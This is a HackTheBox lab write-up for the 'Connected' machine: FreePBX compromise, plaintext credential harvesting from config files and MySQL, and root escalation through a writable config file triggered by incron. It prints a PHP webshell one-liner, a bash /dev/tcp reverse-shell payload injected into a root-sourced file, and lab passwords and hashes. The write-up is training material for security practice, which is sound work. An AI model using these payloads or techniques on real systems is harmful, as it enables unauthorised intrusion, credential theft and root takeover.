# Connected – HackTheBox Writeup

**Target:** Connected (10.129.X.X)
**Attacker:** Kali Linux
**OS:** Linux (CentOS 7, Kernel 5.4.239)
**Difficulty:** Easy
**Attack Path:** FreePBX RCE → Writable Config File → Incron Root Trigger

---

## Recon

### Port Scan

```bash
nmap -sV -p- --min-rate 5000 connected.htb
```

SSH on 22 and HTTP on 80 running a phone system web interface. Added the hostname to /etc/hosts and opened it in the browser.

### Identifying FreePBX

Didn't need any special tools for this one. The footer of the web page just tells you:

```
FreePBX 16.0.40.7 is licensed under the GPL
Copyright© 2007-2026
```

Version number sitting right there in plain sight. That's all you need to start looking for exploits.

---

## Getting a Shell

Googled `FreePBX 16.0.40.7 CVE exploit` and found a GitHub repo with a working PoC. Downloaded it, pointed it at the target, and got a shell as `asterisk`. Why spend hours poking at login forms when someone already found the bug and wrote the exploit for you?

```bash
id
# uid=999(asterisk) gid=1000(asterisk)
```

Grabbed the user flag:

```bash
cat /home/*/user.txt
```

### The Web Root

While poking around I checked the web root:

```bash
ls /var/www/html/
# admin  index.php  restapps  robots.txt  ucp  wcb.php  yi4q2z81hc
```

Two things stood out immediately. `yi4q2z81hc` is a directory with a random hash looking name. That's suspicious by itself because nobody names directories like that unless they're trying to hide something. Inside it:

```bash
cat /var/www/html/yi4q2z81hc/hqlvxiwb.php
# <?php if(isset($_REQUEST["cmd"])){echo "<pre>";system($_REQUEST["cmd"]);echo "</pre>";} ?>
```

Classic one liner webshell. Takes a `cmd` parameter and passes it straight to `system()` with zero filtering. The `.php0` file next to it is probably a failed first upload since Apache won't execute `.php0` as PHP.

`wcb.php` was ionCube encrypted so completely unreadable without the loader. Moved on.

---

## Enumeration

### FreePBX Credentials

FreePBX loves storing passwords in plaintext config files. Always check these on any FreePBX box:

```bash
cat /etc/freepbx.conf
```

```php
$amp_conf["AMPDBUSER"] = "freepbxuser";
$amp_conf["AMPDBPASS"] = "mZzDpAGKTmPJ";
```

Database credentials right there. Then the big one:

```bash
cat /etc/amportal.conf | grep -iE "pass|secret"
```

```
AMPMGRPASS=fe1mYBs7D5P3
FPBX_ARI_PASSWORD=04cd5eb91771e9eb716aeee1ed6812e0
PHP_CONSOLE_PASSWORD=batteryhorsestaple
```

Three more passwords. Tried all of them with `su - root`. None worked. Password reuse didn't pay off this time.

### Digging Through MySQL

Connected to the database with the FreePBX credentials and dumped the interesting tables:

```bash
mysql -u freepbxuser -pmZzDpAGKTmPJ asterisk -e "SELECT * FROM ampusers;"
```

```
| admin     | 05c689686a4fad5ce3ec76e7ae5708b1fe2da43a |
| svc_5o4wq | 822e4c53274e186993ff2f9861e7f5f8b6c63313 |
| svc_tlrov | 7575ebeca6092b78c72168edde5e6900f98de0c2 |
| svc_wx14i | 5d44a200182b200bf824e288428b39010263bbb1 |
```

SHA1 hashes. Could throw these at CrackStation or John but they ended up not being the path forward.

The `manager` table had Asterisk Manager Interface credentials:

```bash
mysql -u freepbxuser -pmZzDpAGKTmPJ asterisk -e "SELECT * FROM manager;"
```

```
cxpanel | cxmanager*con | read: all | write: system,call,command,...
```

The `cxpanel` user has `command` write access to AMI. AMI was listening on port 5038 and I was able to log in and try to execute commands through Asterisk's `Originate` action with `Application: System`. But the System application was restricted on this box. APPERROR every time. Dead end.

### The Root Service on Port 4000

Checked running processes and found something interesting:

```bash
ps aux | grep root
```

```
root 1358 /usr/bin/python3.6 -m aiohttp.web aiovega.web:app_factory -H 127.0.0.1 -P 4000
```

A Python web service running as root, only listening locally. Curled it:

```bash
curl http://127.0.0.1:4000/
# {"status": 400, "message": "Vega to proxy to isn't specified"}
```

Read the source code at `/usr/lib/python3.6/site-packages/aiovega/` and figured out it's a proxy for managing Vega network gateways. It takes a `X-Vega-Connection` header with a URL like `ssh://user:pass@host` and connects to that device to run commands. Tried every password I'd collected for root SSH through this proxy. All came back "Permission denied". Another dead end.

Spent a lot of time on both AMI and the Vega proxy. Neither was the intended path. Sometimes enumeration means learning what doesn't work.

---

## Privilege Escalation

### Finding Writable Config Files

The real path was much simpler than anything I tried above. Searched for writable files under `/etc`:

```bash
find /etc -writable 2>/dev/null | grep -v "/etc/wanpipe\|/etc/asterisk\|/etc/schmooze" | head -20
```

Among the results: `/etc/dahdi/init.conf`. A config file owned by root that we can write to. That's always worth investigating because something privileged probably reads it.

### Discovering the Incron Rule

This is where I made my biggest mistake during enumeration. I checked `incrontab -l` early on and it showed nothing useful. But that only shows user level incron tables. The system level rules live in a completely different place:

```bash
cat /etc/incron.d/*
```

```
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

Incron is like cron but instead of running on a schedule it watches for filesystem events. This rule says: whenever someone writes to `/var/spool/asterisk/sysadmin/dahdi_restart`, execute `/usr/sbin/sysadmin_dahdi_restart` as root. And that script sources `/etc/dahdi/init.conf` during execution.

So the chain is: we write to `init.conf` (which we can because it's writable), then trigger the incron event by touching the monitored file, and whatever we put in `init.conf` runs as root.

### Root Shell

Appended a reverse shell payload to the writable config file:

```bash
echo 'bash -c "bash -i >& /dev/tcp/YOUR_IP/4445 0>&1" &' >> /etc/dahdi/init.conf
```

Started a listener on Kali:

```bash
nc -lvnp 4445
```

Triggered the incron event:

```bash
echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart
```

Shell popped.

```bash
whoami
# root
cat /root/root.txt
```

Box pwned.

---

## Attack Chain Summary

```
nmap → FreePBX 16.0.40.7 on port 80
→ Google CVE + GitHub PoC → Shell as asterisk
→ User flag
→ find /etc -writable → /etc/dahdi/init.conf
→ cat /etc/incron.d/* → dahdi_restart triggers root script
→ Root script sources init.conf
→ Injected reverse shell into init.conf
→ Triggered incron event → Root shell
```

---

## What I Learned

Version numbers on web pages are free recon. FreePBX had its exact version right there in the footer. The moment you see a version number, google it with CVE. The exploit was sitting on GitHub ready to use.

`find /etc -writable` should be one of the first things you run after getting a shell. The writable `init.conf` was the entire privilege escalation. If a root process reads a file you can write to, that's game over.

Incron has two separate places to check. `incrontab -l` shows user tables. `/etc/incron.d/` has the system level rules. I only checked user tables and completely missed the system rules. Same thing applies to cron. User crontabs live in `/var/spool/cron/`, system ones in `/etc/cron.d/` and `/etc/crontab`. Always check both.

FreePBX boxes are a goldmine of plaintext credentials. `/etc/freepbx.conf`, `/etc/amportal.conf`, and the `manager` table in MySQL all had passwords just sitting there. Even though none of them worked for root on this box, collecting every credential you find is still important because password reuse is real and common.

Don't get tunnel vision on one escalation path. I spent a ton of time on the AMI service and the Vega proxy because they looked exciting. A root process running on port 4000, command execution through AMI, all very cool. But the actual path was a simple writable config file. When something isn't working after a while, move on and enumerate harder.

When `su` doesn't work with any of your collected passwords, the answer is almost certainly in file permissions or misconfigurations, not in finding another password.

*Educational purposes only. This is a HackTheBox machine in a controlled lab environment.*
